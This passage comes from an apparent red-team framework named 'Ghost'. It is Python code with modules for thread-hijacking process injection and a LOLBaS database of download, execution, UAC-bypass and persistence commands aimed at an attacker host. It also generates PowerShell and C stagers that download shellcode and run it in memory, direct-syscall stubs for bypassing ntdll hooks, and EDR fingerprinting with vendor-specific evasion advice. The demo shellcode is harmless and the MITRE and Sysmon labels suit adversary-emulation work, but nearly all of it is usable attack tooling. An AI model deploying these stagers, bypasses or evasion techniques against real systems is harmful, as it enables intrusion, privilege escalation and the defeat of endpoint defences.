            "    CloseHandle(snap);\n\n"
            "    SuspendThread(hThread);\n"
            "    CONTEXT ctx;\n"
            "    ctx.ContextFlags = CONTEXT_FULL;\n"
            "    GetThreadContext(hThread, &ctx);\n\n"
            "#ifdef _WIN64\n"
            "    ctx.Rip = (DWORD64)addr;\n"
            "#else\n"
            "    ctx.Eip = (DWORD)addr;\n"
            "#endif\n\n"
            "    SetThreadContext(hThread, &ctx);\n"
            "    ResumeThread(hThread);\n\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )


# ──────────────────────────── Module 4: LOLBaS ──────────────────────────── #

class LOLBaSModule:
    """Living Off the Land Binaries and Scripts.
    Maps to MITRE T1218 — System Binary Proxy Execution.
    """

    NAME = "LOLBaS Command Generator"

    DATABASE = {
        "execution": [
            {
                "binary": "mshta.exe",
                "mitre": "T1218.005",
                "command": 'mshta.exe "javascript:a=new ActiveXObject(\'Wscript.Shell\');a.Run(\'<PAYLOAD>\');close()"',
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)"],
                "edr_notes": "High visibility — mshta spawning child processes is a top-tier alert"
            },
            {
                "binary": "rundll32.exe",
                "mitre": "T1218.011",
                "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"Wscript.Shell\");h.Run(\"<PAYLOAD>\");",
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)", "11 (File Create)"],
                "edr_notes": "Commonly monitored — rundll32 executing scripts is well-signatured"
            },
            {
                "binary": "regsvr32.exe",
                "mitre": "T1218.010",
                "command": "regsvr32.exe /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "Squiblydoo attack — network connection from regsvr32 is flagged"
            },
            {
                "binary": "certutil.exe",
                "mitre": "T1218",
                "command": "certutil.exe -urlcache -split -f http://<LHOST>/payload.exe %TEMP%\\payload.exe",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)", "11 (File Create)"],
                "edr_notes": "Heavily monitored — certutil downloading files is a primary detection rule"
            },
            {
                "binary": "msiexec.exe",
                "mitre": "T1218.007",
                "command": "msiexec.exe /q /i http://<LHOST>/payload.msi",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "Medium detection — MSI install from network URL raises alerts"
            },
            {
                "binary": "wmic.exe",
                "mitre": "T1218",
                "command": "wmic.exe process call create \"<PAYLOAD>\"",
                "sysmon_events": ["1 (Process Create)", "20 (WmiEvent)"],
                "edr_notes": "WMIC process creation is heavily logged and monitored"
            },
            {
                "binary": "cmstp.exe",
                "mitre": "T1218.003",
                "command": "cmstp.exe /ni /s <malicious.inf>",
                "sysmon_events": ["1 (Process Create)", "12 (Registry Event)"],
                "edr_notes": "Less commonly monitored — effective for UAC bypass"
            },
            {
                "binary": "forfiles.exe",
                "mitre": "T1218",
                "command": 'forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c "<PAYLOAD>"',
                "sysmon_events": ["1 (Process Create)"],
                "edr_notes": "Low visibility — forfiles is rarely monitored directly"
            },
            {
                "binary": "pcalua.exe",
                "mitre": "T1218",
                "command": "pcalua.exe -a <PAYLOAD>",
                "sysmon_events": ["1 (Process Create)"],
                "edr_notes": "Low visibility — Program Compatibility Assistant rarely monitored"
            },
        ],
        "download": [
            {
                "binary": "certutil.exe",
                "mitre": "T1105",
                "command": "certutil.exe -urlcache -split -f http://<LHOST>/<FILE> %TEMP%\\<FILE>",
                "sysmon_events": ["3 (Network Connection)", "11 (File Create)"],
                "edr_notes": "Primary download detection vector — always flagged"
            },
            {
                "binary": "bitsadmin.exe",
                "mitre": "T1105",
                "command": "bitsadmin.exe /transfer job /download /priority high http://<LHOST>/<FILE> %TEMP%\\<FILE>",
                "sysmon_events": ["3 (Network Connection)", "11 (File Create)"],
                "edr_notes": "BITS jobs are logged and monitored by most EDRs"
            },
            {
                "binary": "PowerShell (IWR)",
                "mitre": "T1105",
                "command": "powershell.exe -c \"Invoke-WebRequest -Uri http://<LHOST>/<FILE> -OutFile %TEMP%\\<FILE>\"",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "PowerShell network activity always logged via ScriptBlock/Module logging"
            },
            {
                "binary": "Start-BitsTransfer",
                "mitre": "T1105",
                "command": "powershell.exe -c \"Start-BitsTransfer -Source http://<LHOST>/<FILE> -Destination %TEMP%\\<FILE>\"",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "BITS transfer via PowerShell — double logging (PS + BITS)"
            },
        ],
        "compile_execute": [
            {
                "binary": "csc.exe",
                "mitre": "T1127.001",
                "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:%TEMP%\\payload.exe <source.cs>",
                "sysmon_events": ["1 (Process Create)", "11 (File Create)"],
                "edr_notes": "CSC compiling code at runtime is suspicious — logged but less commonly alerted"
            },
            {
                "binary": "MSBuild.exe",
                "mitre": "T1127.001",
                "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe <malicious.csproj>",
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)"],
                "edr_notes": "MSBuild inline tasks can execute arbitrary code — high detection in mature environments"
            },
            {
                "binary": "InstallUtil.exe",
                "mitre": "T1218.004",
                "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U <payload.dll>",
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)"],
                "edr_notes": "InstallUtil /U (uninstall) executes Uninstall() method — well-known bypass"
            },
        ],
        "uac_bypass": [
            {
                "binary": "fodhelper.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"<PAYLOAD>\" /f && fodhelper.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Classic UAC bypass — registry write + auto-elevate binary"
            },
            {
                "binary": "eventvwr.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"<PAYLOAD>\" /f && eventvwr.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Registry hijack — eventvwr.exe reads HKCU before HKCR"
            },
            {
                "binary": "computerdefaults.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"<PAYLOAD>\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f && computerdefaults.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Similar to fodhelper — uses ms-settings handler hijack"
            },
            {
                "binary": "sdclt.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /d \"<PAYLOAD>\" /f && reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /v DelegateExecute /f && sdclt.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Backup utility UAC bypass — effective on Windows 10"
            },
        ],
        "persistence": [
            {
                "binary": "schtasks.exe",
                "mitre": "T1053.005",
                "command": 'schtasks.exe /create /tn "SystemUpdate" /tr "<PAYLOAD>" /sc onlogon /rl highest',
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Scheduled task creation is a primary persistence detection vector"
            },
            {
                "binary": "reg.exe (Run key)",
                "mitre": "T1547.001",
                "command": 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Updater" /d "<PAYLOAD>" /f',
                "sysmon_events": ["12/13 (Registry Event)"],
                "edr_notes": "Run key modification — most basic persistence, always monitored"
            },
            {
                "binary": "sc.exe",
                "mitre": "T1543.003",
                "command": 'sc create GhostSvc binPath= "<PAYLOAD>" start= auto',
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Service creation requires admin — logged in Security event log"
            },
            {
                "binary": "wmic.exe (startup)",
                "mitre": "T1547.001",
                "command": 'wmic startup call create "name=Updater, command=<PAYLOAD>"',
                "sysmon_events": ["1 (Process Create)", "20 (WmiEvent)"],
                "edr_notes": "WMI startup entry — less commonly monitored than registry Run keys"
            },
        ],
    }

    def run(self, ctx: EngagementContext):
        _section("Module 4 — LOLBaS Command Generator [T1218]")

        if ctx.target_os != "windows":
            _warn("LOLBaS database is Windows-specific — skipping on non-Windows target")
            ctx.results.append(AttackResult(
                module="lolbas", action="skip", status="ok",
                severity="info", notes="LOLBaS not applicable on non-Windows target"
            ))
            return

        total_commands = 0
        all_commands = []

        for category, entries in self.DATABASE.items():
            cat_title = category.replace("_", " ").title()
            _info(f"Loading {cat_title} binaries ({len(entries)} entries)...")

            table = Table(title=f"LOLBaS — {cat_title}", box=box.ROUNDED)
            table.add_column("Binary", style="cyan", width=20)
            table.add_column("MITRE", style="dim", width=12)
            table.add_column("Sysmon Events", width=28)
            table.add_column("EDR Risk")

            for entry in entries:
                cmd = entry["command"]
                cmd = cmd.replace("<LHOST>", ctx.lhost).replace("<PAYLOAD>", "cmd.exe /c calc.exe")
                sysmon = ", ".join(entry["sysmon_events"])
                table.add_row(
                    entry["binary"],
                    entry["mitre"],
                    sysmon,
                    entry["edr_notes"][:50] + "..."
                )
                all_commands.append(f"# {entry['binary']} [{entry['mitre']}]\n# {entry['edr_notes']}\n{cmd}\n")
                total_commands += 1

            console.print(table)

        # ── Save all commands ──
        artifact = f"# Ghost LOLBaS Commands — Generated {datetime.now().isoformat()}\n"
        artifact += f"# Target: {ctx.target_os} | LHOST: {ctx.lhost}\n"
        artifact += "# Replace <PAYLOAD>, <FILE>, <LHOST> placeholders as needed\n\n"
        artifact += "\n".join(all_commands)

        path = _save_artifact(ctx, "lolbas_commands.txt", artifact)
        _ok(f"All {total_commands} LOLBaS commands saved to {path}")

        ctx.results.append(AttackResult(
            module="lolbas", action="generate_commands", status="ok",
            severity="high",
            notes=f"Generated {total_commands} LOLBaS commands across {len(self.DATABASE)} categories"
        ))


# ──────────────────────────── Module 5: Shellcode ──────────────────────────── #

class ShellcodeModule:
    """Shellcode staging, transformation, and analysis.
    Maps to MITRE T1027.002 — Software Packing / T1106 — Native API.
    """

    NAME = "Shellcode Staging & Transformation"

    def run(self, ctx: EngagementContext):
        _section("Module 5 — Shellcode Staging & Transformation [T1027/T1106]")

        # Demo shellcode (NOP sled + INT3 — harmless)
        demo_sc = bytes([0x90] * 8 + [0xCC] + [0x90] * 7)
        _info(f"Working with demo shellcode ({len(demo_sc)} bytes)")

        # ── Format Converters ──
        _info("Generating shellcode format conversions...")
        formats = {
            "hex_string": demo_sc.hex(),
            "c_array": "unsigned char sc[] = { " + ", ".join([f"0x{b:02x}" for b in demo_sc]) + " };",
            "python_bytes": "sc = b'" + "".join([f"\\x{b:02x}" for b in demo_sc]) + "'",
            "powershell_array": "[Byte[]] $sc = @(" + ", ".join([f"0x{b:02X}" for b in demo_sc]) + ")",
            "csharp_array": "byte[] sc = new byte[] { " + ", ".join([f"0x{b:02x}" for b in demo_sc]) + " };",
            "base64": base64.b64encode(demo_sc).decode(),
        }

        table = Table(title="Shellcode Format Conversions", box=box.ROUNDED)
        table.add_column("Format", style="cyan", width=18)
        table.add_column("Output Preview", max_width=52)
        for fmt, val in formats.items():
            preview = val[:80] + "..." if len(val) > 80 else val
            table.add_row(fmt.replace("_", " ").title(), preview)
        console.print(table)
        _ok(f"Generated {len(formats)} format conversions")

        # ── XOR Encoder with null-byte avoidance ──
        _info("Encoding shellcode with XOR (null-byte avoidance)...")
        xor_key = self._find_safe_xor_key(demo_sc)
        xor_encoded = _xor_bytes(demo_sc, bytes([xor_key]))
        null_count = xor_encoded.count(0)
        if null_count > 0:
            _warn(f"XOR-encoded output contains {null_count} null bytes — trying multi-byte key")
            xor_key_multi = self._find_safe_multibyte_key(demo_sc, 4)
            xor_encoded = _xor_bytes(demo_sc, xor_key_multi)
            _ok(f"Multi-byte XOR key: {xor_key_multi.hex()} — null bytes: {xor_encoded.count(0)}")
        else:
            _ok(f"Single-byte XOR key: 0x{xor_key:02x} — zero null bytes in output")

        # ── Stager Generation ──
        _info("Generating download-and-execute stager...")
        stager_ps = self._gen_stager_ps(ctx)
        stager_c = self._gen_stager_c(ctx)
        _save_artifact(ctx, "stager.ps1", stager_ps)
        _save_artifact(ctx, "stager.c", stager_c)
        _ok(f"HTTP stager generated — Stage URL: http://{ctx.lhost}:{ctx.lport}/stage")

        # ── Meterpreter URL Generator ──
        _info("Generating Meterpreter staging URLs...")
        met_urls = [
            f"http://{ctx.lhost}:{ctx.lport}/reverse_tcp",
            f"https://{ctx.lhost}:443/reverse_https",
            f"http://{ctx.lhost}:{ctx.lport}/{secrets.token_hex(4)}",
        ]
        for url in met_urls:
            _ok(f"  Stage URL: {url}")

        # ── Syscall Stub Generation ──
        _info("Generating direct syscall stubs (ntdll bypass)...")
        syscall_stub = self._gen_syscall_stubs(ctx)
        path = _save_artifact(ctx, "syscall_stubs.asm", syscall_stub)
        _ok(f"Syscall stubs saved to {path}")
        _warn("Syscall numbers vary by Windows build — verify against target OS version")

        # ── Shellcode Analysis ──
        _info("Analyzing shellcode properties...")
        analysis = {
            "size": len(demo_sc),
            "null_bytes": demo_sc.count(0),
            "bad_chars": self._find_bad_chars(demo_sc),
            "entropy": _calc_entropy(demo_sc),
            "nop_sled_detected": demo_sc[:4] == b'\x90\x90\x90\x90',
        }

        table = Table(title="Shellcode Analysis", box=box.ROUNDED)
        table.add_column("Property", style="cyan")
        table.add_column("Value", justify="right")
        table.add_column("Assessment")
        table.add_row("Size", f"{analysis['size']} bytes",
                       "OK" if analysis['size'] < 4096 else "Large — consider staging")
        table.add_row("Null Bytes", str(analysis['null_bytes']),
                       "[green]Clean[/green]" if analysis['null_bytes'] == 0 else f"[red]{analysis['null_bytes']} found[/red]")
        table.add_row("Bad Characters", str(len(analysis['bad_chars'])),
                       "[green]None[/green]" if not analysis['bad_chars'] else f"[yellow]{', '.join(f'0x{b:02x}' for b in analysis['bad_chars'][:5])}[/yellow]")
        table.add_row("Entropy", f"{analysis['entropy']:.4f}",
                       "[green]Low[/green]" if analysis['entropy'] < 6.0 else "[yellow]Moderate[/yellow]")
        table.add_row("NOP Sled", str(analysis['nop_sled_detected']),
                       "[yellow]Detected[/yellow]" if analysis['nop_sled_detected'] else "Clean")
        console.print(table)

        # ── Save all formats ──
        fmt_artifact = "\n\n".join([f"// Format: {k}\n{v}" for k, v in formats.items()])
        _save_artifact(ctx, "shellcode_formats.txt", fmt_artifact)
        _ok("All shellcode formats saved")

        ctx.results.append(AttackResult(
            module="shellcode", action="stage_and_transform", status="ok",
            severity="high",
            notes=f"Generated {len(formats)} format conversions, stagers, syscall stubs, and analysis"
        ))

    @staticmethod
    def _find_safe_xor_key(data: bytes) -> int:
        for key in range(1, 256):
            encoded = bytes([b ^ key for b in data])
            if 0 not in encoded:
                return key
        return 0x41  # fallback

    @staticmethod
    def _find_safe_multibyte_key(data: bytes, key_len: int) -> bytes:
        for _ in range(100):
            key = secrets.token_bytes(key_len)
            encoded = _xor_bytes(data, key)
            if 0 not in encoded:
                return key
        return secrets.token_bytes(key_len)

    @staticmethod
    def _find_bad_chars(data: bytes, bad_list=None) -> list:
        if bad_list is None:
            bad_list = [0x00, 0x0a, 0x0d, 0x20, 0x25, 0x26, 0x2b, 0x3d]
        return [b for b in bad_list if b in data]

    @staticmethod
    def _gen_stager_ps(ctx: EngagementContext) -> str:
        return (
            f"# PowerShell Download-and-Execute Stager\n"
            f"# Fetches shellcode from HTTP server and executes in memory\n\n"
            f"$url = 'http://{ctx.lhost}:{ctx.lport}/stage'\n"
            f"$wc = New-Object System.Net.WebClient\n"
            f"$sc = $wc.DownloadData($url)\n\n"
            f"$k32 = Add-Type -MemberDefinition @\"\n"
            f"[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);\n"
            f"[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);\n"
            f"[DllImport(\"kernel32.dll\")] public static extern UInt32 WaitForSingleObject(IntPtr a, UInt32 b);\n"
            f"\"@ -Name 'K32' -Namespace 'Win32' -PassThru\n\n"
            f"$addr = $k32::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)\n"
            f"[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)\n"
            f"$thread = $k32::CreateThread(0, 0, $addr, 0, 0, 0)\n"
            f"$k32::WaitForSingleObject($thread, [uint32]'0xFFFFFFFF')\n"
        )

    @staticmethod
    def _gen_stager_c(ctx: EngagementContext) -> str:
        return (
            f"// C Download-and-Execute Stager\n"
            f"// Fetches shellcode via HTTP and executes from allocated memory\n\n"
            f"#include <windows.h>\n#include <wininet.h>\n#include <stdio.h>\n"
            f"#pragma comment(lib, \"wininet.lib\")\n\n"
            f"int main() {{\n"
            f"    HINTERNET hInternet = InternetOpenA(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n"
            f"    HINTERNET hUrl = InternetOpenUrlA(hInternet,\n"
            f"        \"http://{ctx.lhost}:{ctx.lport}/stage\", NULL, 0,\n"
            f"        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);\n\n"
            f"    BYTE buf[4096];\n"
            f"    DWORD bytesRead = 0;\n"
            f"    DWORD totalRead = 0;\n"
            f"    BYTE* payload = (BYTE*)VirtualAlloc(NULL, 1024*1024,\n"
            f"                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n"
            f"    while (InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {{\n"
            f"        memcpy(payload + totalRead, buf, bytesRead);\n"
            f"        totalRead += bytesRead;\n"
            f"    }}\n\n"
            f"    InternetCloseHandle(hUrl);\n"
            f"    InternetCloseHandle(hInternet);\n\n"
            f"    ((void(*)())payload)();\n"
            f"    return 0;\n}}\n"
        )

    @staticmethod
    def _gen_syscall_stubs(ctx: EngagementContext) -> str:
        arch = ctx.arch
        if arch == "x64":
            return (
                "; Direct Syscall Stubs — x64\n"
                "; Bypass ntdll.dll userland hooks by issuing syscalls directly\n"
                "; WARNING: Syscall numbers are Windows-build-specific\n\n"
                "; NtAllocateVirtualMemory (Win10 21H2: 0x18)\n"
                "NtAllocateVirtualMemory PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 18h          ; syscall number — VERIFY for target build\n"
                "    syscall\n"
                "    ret\n"
                "NtAllocateVirtualMemory ENDP\n\n"
                "; NtWriteVirtualMemory (Win10 21H2: 0x3A)\n"
                "NtWriteVirtualMemory PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 3Ah\n"
                "    syscall\n"
                "    ret\n"
                "NtWriteVirtualMemory ENDP\n\n"
                "; NtCreateThreadEx (Win10 21H2: 0xC1)\n"
                "NtCreateThreadEx PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 0C1h\n"
                "    syscall\n"
                "    ret\n"
                "NtCreateThreadEx ENDP\n\n"
                "; NtProtectVirtualMemory (Win10 21H2: 0x50)\n"
                "NtProtectVirtualMemory PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 50h\n"
                "    syscall\n"
                "    ret\n"
                "NtProtectVirtualMemory ENDP\n"
            )
        else:
            return (
                "; Direct Syscall Stubs — x86\n"
                "; Bypass ntdll.dll userland hooks\n\n"
                "; NtAllocateVirtualMemory\n"
                "_NtAllocateVirtualMemory@24 PROC\n"
                "    mov eax, 18h\n"
                "    mov edx, offset _sysentry\n"
                "    call edx\n"
                "    ret 24\n"
                "_NtAllocateVirtualMemory@24 ENDP\n\n"
                "_sysentry PROC\n"
                "    mov edx, esp\n"
                "    sysenter\n"
                "    ret\n"
                "_sysentry ENDP\n"
            )


# ──────────────────────────── Module 6: EDR Fingerprint ──────────────────────────── #

class EDRFingerprintModule:
    """EDR detection and fingerprinting.
    Maps to MITRE T1497 — Virtualization/Sandbox Evasion (reconnaissance).
    """

    NAME = "EDR Fingerprinting"

    EDR_SIGNATURES = {
        "CrowdStrike Falcon": {
            "processes": ["csfalconservice", "CSFalconContainer", "csagent", "falconhost"],
            "services": ["CSFalconService", "csagent"],
            "drivers": ["csdevicecontrol", "csboot", "csagent"],
            "evasion_notes": "Kernel-level visibility — userland unhooking insufficient. "
                            "Consider direct syscalls + sleep obfuscation + indirect syscalls."
        },
        "Carbon Black": {
            "processes": ["CbDefense", "CbDefenseSensor", "RepMgr", "repux", "cbcomms"],
            "services": ["CbDefenseSensor", "CarbonBlack"],
            "drivers": ["carbonblackk", "cbk7", "cbstream"],
            "evasion_notes": "Heavy behavioral analysis — avoid common injection patterns. "
                            "Process hollowing is well-detected. Use thread pool injection."
        },
        "SentinelOne": {
            "processes": ["SentinelAgent.exe", "SentinelServiceHost", "SentinelStaticEngine",
                         "SentinelUI"],
            "services": ["SentinelAgent", "SentinelStaticEngineScanner"],
            "drivers": ["sentinelmonitor"],
            "evasion_notes": "AI-based static analysis — polymorphic payloads recommended. "
                            "Strong userland hooks — direct syscalls needed."
        },
        "Cylance": {
            "processes": ["CylanceSvc", "CylanceUI", "CylanceProtectSetup"],
            "services": ["CylanceSvc"],
            "drivers": ["cyoptics", "cyprotectdrv"],
            "evasion_notes": "ML-based pre-execution analysis — focus on in-memory execution. "
                            "Fileless techniques are more effective."
        },
        "Microsoft Defender": {
            "processes": ["MsMpEng.exe", "MsSense.exe", "SenseIR.exe", "SenseCncProxy.exe",
                         "SecurityHealthService.exe"],
            "services": ["WinDefend", "WdNisSvc", "Sense"],
            "drivers": ["WdFilter", "WdNisDrv", "WdBoot"],
            "evasion_notes": "AMSI integration — bypass AMSI first. Cloud-connected analysis — "
                            "air-gapped payloads may bypass cloud lookups. Tamper protection "
                            "prevents service stopping."
        },
        "Sophos": {
            "processes": ["SophosAgent", "SophosClean", "SophosHealth", "sopaborern",
                         "SophosFileScanner"],
            "services": ["Sophos Agent", "Sophos AutoUpdate Service", "Sophos MCS Agent"],
            "drivers": ["sophosed", "sophosel"],
            "evasion_notes": "Intercept X has behavioral detection — avoid known injection chains. "
                            "Deep learning engine requires novel payload structures."
        },
        "Symantec / Broadcom": {
            "processes": ["ccSvcHst.exe", "SMC.exe", "SmcGui.exe", "SepMasterService"],
            "services": ["SepMasterService", "SmcService"],
            "drivers": ["symevent", "srtsp"],
            "evasion_notes": "Signature-heavy — encoding and packing are effective. "
                            "Behavioral engine is weaker than CrowdStrike/SentinelOne."
        },
        "Palo Alto Cortex XDR": {
            "processes": ["CortexXDR.exe", "Traps.exe", "cyserver.exe", "CETASvc.exe"],
            "services": ["CortexXDR", "Traps"],
            "drivers": ["tdevflt", "cyverak"],
            "evasion_notes": "Strong kernel visibility — behavioral IoC correlation. "
                            "Analytics module correlates across endpoints — isolated testing advised."
        },
        "Elastic Security": {
            "processes": ["elastic-agent", "winlogbeat", "filebeat", "elastic-endpoint"],
            "services": ["ElasticAgent", "ElasticEndpoint"],
            "drivers": [],
            "evasion_notes": "Rule-based + ML. Open detection rules — review elastic/detection-rules "
                            "on GitHub to understand coverage gaps."
        },
        "Trend Micro": {
            "processes": ["TMBMSRV.exe", "TmCCSF.exe", "NTRtScan.exe", "PccNTMon.exe",
                         "TmListen.exe"],
            "services": ["TrendMicro", "TMBMSRV", "TMBMServer"],
            "drivers": ["tmevtmgr", "tmtdi", "tmactmon"],
            "evasion_notes": "Virtual patching via IPS — check network-level blocking. "
                            "Behavioral monitoring can be evaded with staged execution."
        },
    }

    def run(self, ctx: EngagementContext):
        _section("Module 6 — EDR Fingerprinting [T1497]")

        # ── Process-based Detection ──
        _info("Scanning for known EDR processes...")
        detected_edrs = []

        if ctx.target_os == "windows":
            try:
                import subprocess
                result = subprocess.run(
                    ["tasklist", "/FO", "CSV", "/NH"],
                    capture_output=True, text=True, timeout=10
                )
                running = result.stdout.lower()
            except Exception:
                running = ""
                _warn("Could not enumerate processes — generating offline reference instead")
        else:
            running = ""
            _info("Non-Windows target — generating offline EDR reference database")

        for vendor, sig in self.EDR_SIGNATURES.items():
            found_procs = [p for p in sig["processes"] if p.lower() in running]
            if found_procs:
                detected_edrs.append((vendor, found_procs))
                _crit(f"DETECTED: {vendor} — processes: {', '.join(found_procs)}")
            else:
                _info(f"Not detected: {vendor}")

        # ── Service-based Detection ──
        _info("Checking for EDR services...")
        if ctx.target_os == "windows":
            try:
                result = subprocess.run(
                    ["sc", "query", "type=", "service", "state=", "all"],
                    capture_output=True, text=True, timeout=10
                )
                services = result.stdout.lower()
            except Exception:
                services = ""

            for vendor, sig in self.EDR_SIGNATURES.items():
                found_svcs = [s for s in sig["services"] if s.lower() in services]
                if found_svcs:
                    _crit(f"SERVICE: {vendor} — {', '.join(found_svcs)}")

        # ── Driver-based Detection ──
        _info("Checking for EDR filter drivers...")
        if ctx.target_os == "windows":
            try:
                result = subprocess.run(
                    ["fltMC"], capture_output=True, text=True, timeout=10
                )
                drivers = result.stdout.lower()
            except Exception:
                drivers = ""

            for vendor, sig in self.EDR_SIGNATURES.items():
                found_drvs = [d for d in sig["drivers"] if d.lower() in drivers]
                if found_drvs:
                    _crit(f"DRIVER: {vendor} — {', '.join(found_drvs)}")

        # ── DLL Hook Detection Concept ──
        _info("Generating ntdll hook detection concept...")
        hook_detection_concept = (
            "# ntdll.dll Userland Hook Detection Concept\n"
            "# Compare .text section of in-memory ntdll against clean copy from disk\n\n"
            "# Steps:\n"
            "# 1. Read clean ntdll.dll from C:\\Windows\\System32\\ntdll.dll\n"
            "# 2. Parse PE headers to locate .text section (RVA + size)\n"
            "# 3. Get base address of loaded ntdll via GetModuleHandle\n"
            "# 4. Compare byte-by-byte: disk .text vs memory .text\n"
            "# 5. Any differences indicate hooks (JMP/CALL patches by EDR)\n"
            "# 6. To unhook: overwrite hooked bytes with clean copy from disk\n\n"
            "# Detection signatures:\n"
            "# - 0xE9 (JMP rel32) at function start = trampoline hook\n"
            "# - 0xFF 0x25 (JMP [addr]) = IAT-style redirect\n"
            "# - Modified syscall stubs (mov eax, SSN changed or removed)\n"
        )
        _save_artifact(ctx, "hook_detection_concept.txt", hook_detection_concept)
        _ok("Hook detection concept documented")

        # ── ETW Provider Enumeration ──
        _info("Documenting ETW security providers...")
        etw_providers = [
            ("Microsoft-Windows-Security-Auditing", "Security event log — logon, privilege use, object access"),
            ("Microsoft-Windows-Sysmon", "Sysmon — process create, network, registry, file events"),
            ("Microsoft-Windows-PowerShell", "PowerShell script block logging, module logging"),
            ("Microsoft-Antimalware-Scan-Interface", "AMSI scan events — content inspection"),
            ("Microsoft-Windows-Threat-Intelligence", "ETW TI — memory allocation/protection monitoring (kernel)"),
            ("Microsoft-Windows-Kernel-Process", "Kernel process creation/termination events"),
            ("Microsoft-Windows-DNS-Client", "DNS query logging"),
        ]

        table = Table(title="ETW Security Providers", box=box.ROUNDED)
        table.add_column("Provider", style="cyan")
        table.add_column("Coverage")
        for name, desc in etw_providers:
            table.add_row(name, desc)
        console.print(table)

        # ── EDR Reference Table ──
        table = Table(title="EDR Vendor Reference", box=box.ROUNDED)
        table.add_column("Vendor", style="cyan", width=22)
        table.add_column("Key Processes", width=30)
        table.add_column("Evasion Guidance")

        for vendor, sig in self.EDR_SIGNATURES.items():
            procs = ", ".join(sig["processes"][:3])
            if len(sig["processes"]) > 3:
                procs += f" (+{len(sig['processes'])-3})"
            table.add_row(vendor, procs, sig["evasion_notes"][:70] + "...")
        console.print(table)

        # ── Evasion Recommendations ──
        if detected_edrs:
            _section("Evasion Recommendations")
            for vendor, procs in detected_edrs:
                _crit(f"{vendor} detected — evasion guidance:")
                console.print(f"    {self.EDR_SIGNATURES[vendor]['evasion_notes']}", style="yellow")
        else:
            _info("No EDR detected on local system (or running in offline mode)")

        # ── Save full report ──
        report = "# EDR Fingerprint Report\n"
        report += f"# Generated: {datetime.now().isoformat()}\n"
        report += f"# Target OS: {ctx.target_os}\n\n"

        if detected_edrs:
            report += "## Detected EDR Products\n"
            for vendor, procs in detected_edrs:
                report += f"\n### {vendor}\n"
                report += f"Processes: {', '.join(procs)}\n"
                report += f"Guidance: {self.EDR_SIGNATURES[vendor]['evasion_notes']}\n"
        else:
            report += "## No EDR Detected (offline mode)\n"

        report += "\n## Full Vendor Database\n"
        for vendor, sig in self.EDR_SIGNATURES.items():
            report += f"\n### {vendor}\n"
            report += f"Processes: {', '.join(sig['processes'])}\n"
            report += f"Services: {', '.join(sig['services'])}\n"
            report += f"Drivers: {', '.join(sig['drivers']) if sig['drivers'] else 'N/A'}\n"
            report += f"Guidance: {sig['evasion_notes']}\n"

        path = _save_artifact(ctx, "edr_fingerprint_report.txt", report)
        _ok(f"Full EDR fingerprint report saved to {path}")

        ctx.results.append(AttackResult(
            module="edr_fingerprint", action="fingerprint_edr", status="ok",
            severity="critical",
            notes=f"Scanned {len(self.EDR_SIGNATURES)} vendors, detected {len(detected_edrs)} on local system"
        ))


# ──────────────────────────────── Module Registry ──────────────────────────────── #

MODULE_MAP = {
    "amsi": AMSIBypassModule,
    "av": AVEvasionModule,
    "inject": ProcessInjectionModule,
    "lolbas": LOLBaSModule,
    "shellcode": ShellcodeModule,
    "edr": EDRFingerprintModule,
}


# ──────────────────────────────── Banner & CLI ──────────────────────────────── #

def print_banner():
    banner = pyfiglet.figlet_format("Ghost", font="slant")
